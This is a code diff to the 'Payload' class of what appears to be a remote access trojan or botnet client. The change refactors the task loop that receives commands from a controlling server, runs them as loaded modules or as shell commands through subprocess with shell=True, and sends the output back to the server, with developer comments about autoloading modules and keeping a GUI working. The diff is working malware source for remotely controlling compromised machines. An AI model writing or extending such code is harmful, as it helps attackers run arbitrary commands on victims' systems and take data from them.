@@ -121,10 +121,57 @@ class Payload():
         return collections.namedtuple('flag', ('connection','passive','prompt'))(threading.Event(), threading.Event(), threading.Event())
 
 
-    def _get_command(self, cmd):
+    """ 
+    This function can be optimized to take the task only and split out cmd here.
+    cmd isn't used at all in parent scope
+    """
+    def _get_command(self, cmd, task = None):
+        # Check if the function already exists
         if bool(hasattr(self, cmd) and hasattr(getattr(self, cmd), 'command') and getattr(getattr(self, cmd),'command')):
             return getattr(self, cmd)
-        return False
+
+
+        """
+        Below is a good update. It autoloads modules if you call them. I think the bash use-case 
+            is a bit unintutitve without a load, but thats just my opinion. Eval also fulfils 
+            this functionality so its not removing anything from the shell
+        I just want to make sure this doesn't break the GUI in any way
+        Lmk if you think this is a good update
+        """
+
+        # # Attempt to import the function
+        # load_result = self.load(cmd)
+        # # Check if the module loaded correctly
+
+        if cmd in globals():
+            return globals()[cmd].run
+
+
+        """
+        This can be optimized away when task is only arg to function
+        """
+        if task == None:
+            return False
+
+        # Define a function which will execute the text as a bash script
+        def execute_task():
+            # Encode the task if needed
+            encoded_task = task['task'].encode()
+
+            # Use subprocess.Popen to create the process
+            process = subprocess.Popen(encoded_task, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
+
+            # Use communicate to get the result and errors
+            result, reserr = process.communicate()
+
+            # Return only 1 string value so this behaves like other functions
+            if result == None:
+                result = reserr
+
+            # Return the result and errors
+            return result.decode()
+
+        return execute_task
 
 
     def _get_connection(self, host, port):
@@ -1222,42 +1269,60 @@ class Payload():
 
             # active mode
             elif self.flags.connection.wait(timeout=1.0):
+                # Get Task
                 task = self.recv_task()
-                if self.gui or not self.flags.prompt.is_set():
-                    if isinstance(task, dict) and 'task' in task:
-                        cmd, _, action = task['task'].partition(' ')
-                        try:
-                            # run command as module if module exists.
-                            # otherwise, run as shell command in subprocess
-                            command = self._get_command(cmd)
-                            if command:
-                                result = command(action) if action else command()
-                            else:
-                                result, reserr = subprocess.Popen(task['task'].encode(), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate()
-                                if result == None:
-                                    result = reserr
 
-                            # format result
-                            if result != None:
-                                if type(result) in (list, tuple):
-                                    result = '\n'.join(result)
-                                elif type(result) == bytes:
-                                    result = str(result.decode())
-                                else:
-                                    result = str(result)
-                        except Exception as e:
-                            result = "{} error: {}".format(self.run.__name__, str(e)).encode()
-                            log(result)
+                # Should we kill this process? 
+                if not (self.gui or not self.flags.prompt.is_set()) and self.flags.prompt.set() \
+                  and not self.flags.connection.wait(timeout=1.0):
+                    self.kill()
 
-
-                        # send response to server
-                        task.update({'result': result})
-                        self.send_task(task)
-
+                if not isinstance(task, dict) or 'task' not in task:
                     if not self.gui:
                         self.flags.prompt.set()
-                elif self.flags.prompt.set() and not self.flags.connection.wait(timeout=1.0):
-                    self.kill()
+                    continue 
+
+                """
+                THIS COULD BE OPTIMIZED TO TAKE ONLY TASK. 
+                NEED TO VERIFY IT DOESN'T BREAK GUI THOUGH
+                """
+                cmd, _, action = task['task'].partition(' ')
+                try:
+                    # run command as module if module exists.
+                    # otherwise, run as shell command in subprocess
+                    command = self._get_command(cmd, task)
+                    result = command(action) if action else command()
+
+                    """
+                    if command:
+                        result = command(action) if action else command()
+                    else:
+                        result, reserr = subprocess.Popen(task['task'].encode(), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate()
+                        if result == None:
+                            result = reserr
+                    """
+
+                    # format result
+                    if type(result) in (list, tuple):
+                        result = '\n'.join(result)
+                    elif type(result) == bytes:
+                        result = str(result.decode())
+                    else:
+                        result = str(result) if result else None
+
+                except Exception as e:
+                    # result = "{} error: {}".format(self.run.__name__, str(e)).encode()
+                    result = traceback.format_exc()
+                    log(result)
+
+
+
+                # send response to server
+                task.update({'result': result})
+                self.send_task(task)
+
+                if not self.gui:
+                    self.flags.prompt.set()
             else:
                 log("Connection timed out")
                 break
